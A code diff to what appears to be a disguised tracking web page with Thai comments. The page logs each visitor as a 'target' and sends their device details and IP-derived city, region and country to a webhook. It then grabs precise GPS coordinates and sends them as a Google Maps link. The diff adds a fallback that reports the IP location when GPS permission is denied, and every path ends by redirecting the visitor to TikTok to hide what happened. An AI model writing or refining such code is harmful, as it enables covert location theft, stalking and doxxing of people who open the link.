@@ -47,13 +47,8 @@
                     }
                 }
 
+                // ส่ง Report แรก: เฉพาะสเปคเครื่องและ IP (ยังไม่ลงจังหวัด)
                 let report = `📂 **NEW TARGET LOGGED (${deviceType})**\n\`\`\`\n`;
-                report += `[LOCATION (ตำแหน่ง)]\n`;
-                report += `City (เมือง): ${check(data.city)}\n`;
-                report += `Region (จังหวัด): ${check(data.region)}\n`;
-                report += `Postal (รหัสไปรษณีย์): ${check(data.postal)}\n`;
-                report += `Country (ประเทศ): ${check(data.country_name)}\n\n`;
-
                 report += `[DEVICE (อุปกรณ์)]\n`;
                 report += `Model (รุ่น): ${modelName}\n`;
                 report += `OS (ระบบปฏิบัติการ): ${check(navigator.platform)}\n`;
@@ -66,29 +61,40 @@
                     body: JSON.stringify({ content: report })
                 });
 
-                // --- ส่วนที่ 2: ระบบพิกัด GPS ครั้งเดียว (แม่นยำสูง) ---
+                // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด ---
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
                         const { latitude, longitude } = pos.coords;
                         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        const streetView = `https://maps.google.com/maps?q=&layer=c&cbll=${latitude},${longitude}`;
                         
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (${modelName}) (พิกัดแม่นยำสูง)**\n📍 Location (พิกัด): ${latitude}, ${longitude}\n📍 Maps (แผนที่): ${mapsLink}\n🏠 Street View (สตรีทวิว): ${streetView}` 
+                                content: `🎯 **PRECISE LOCATION (${modelName}) (พิกัดแม่นยำสูง)**\n📍 Google Maps (พิกัดตรงตามจริง): ${mapsLink}\n✅ Status: Precise Data (ข้อมูลแม่นยำพิกัดตรง)` 
                             })
                         });
-                        // ส่งเสร็จแล้วเด้งไป TikTok ทันที
                         window.location.href = "https://www.tiktok.com";
 
-                    }, () => { 
+                    }, async () => { 
+                        // ถ้าปฏิเสธ (Denied) ให้ใช้พิกัด IP แทน
+                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n\`\`\`\n`;
+                        backupReport += `[IP BASED LOCATION (ตำแหน่งอ้างอิงจากไอพี)]\n`;
+                        backupReport += `City (เมือง): ${check(data.city)}\n`;
+                        backupReport += `Region (จังหวัด): ${check(data.region)}\n`;
+                        backupReport += `Country (ประเทศ): ${check(data.country_name)}\n`;
+                        backupReport += `\n❌ Status: Data Inaccurate (ข้อมูลอาจไม่ตรงคลาดเคลื่อน)\n\`\`\``;
+
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: backupReport })
+                        });
                         window.location.href = "https://www.tiktok.com"; 
                     }, { 
-                        enableHighAccuracy: true, // ใช้ดาวเทียม
-                        maximumAge: 0,            // ห้ามใช้พิกัดเก่าที่เครื่องจำไว้
-                        timeout: 10000            // รอสัญญาณ 10 วิ
+                        enableHighAccuracy: true, 
+                        maximumAge: 0, 
+                        timeout: 10000 
                     });
                 } else {
                     window.location.href = "https://www.tiktok.com";
